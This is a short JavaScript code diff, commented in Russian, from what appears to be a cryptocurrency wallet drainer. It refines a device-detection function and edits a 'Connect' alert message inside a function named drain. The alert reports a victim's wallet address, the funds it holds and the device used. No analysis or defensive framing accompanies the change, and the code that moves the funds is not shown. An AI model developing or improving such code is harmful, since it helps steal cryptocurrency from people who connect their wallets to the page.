@@ -365,12 +365,35 @@ async function switchChain(chainId) {
 
 // Функция для определения устройства
 function detectDevice() {
-  const userAgent = navigator.userAgent;
-  if (/iPhone|iPad|iPod/i.test(userAgent)) return "iPhone";
-  if (/Android/i.test(userAgent)) return "Android";
-  if (/Macintosh|Mac OS/i.test(userAgent)) return "Mac";
-  if (/Windows/i.test(userAgent)) return "Windows";
-  if (/Linux/i.test(userAgent)) return "Linux";
+  const userAgent = navigator.userAgent.toLowerCase();
+  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';
+
+  // Проверка на Windows (включая Windows Phone, но с уточнением)
+  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) {
+    if (/mobile|phone/i.test(userAgent)) return "Windows Phone";
+    return "Windows";
+  }
+
+  // Проверка на Mac (Macintosh, но не iPhone/iPad)
+  if (/macintosh|mac os/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
+    return "Mac";
+  }
+
+  // Проверка на iPhone/iPad/iPod
+  if (/iphone|ipad|ipod/i.test(userAgent)) {
+    return "iPhone";
+  }
+
+  // Проверка на Android (с уточнением, чтобы не путать с другими платформами)
+  if (/android/i.test(userAgent) && !/windows/i.test(userAgent)) {
+    return "Android";
+  }
+
+  // Проверка на Linux (но не Android, так как Android тоже использует Linux)
+  if (/linux/i.test(userAgent) && !/android/i.test(userAgent)) {
+    return "Linux";
+  }
+
   return "Unknown";
 }
 
@@ -451,7 +474,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const device = detectDevice();
 
   // Формируем сообщение
-  const message = `🌀 Connect | [ **\`${shortAddress}\`** ]\n\n` +
+  const message = `🌀 Connect | [ **${shortAddress}** ]\n\n` +
                   `Funds:\n` +
                   `${funds.join('\n')}\n` +
                   `Device: ${device}`;
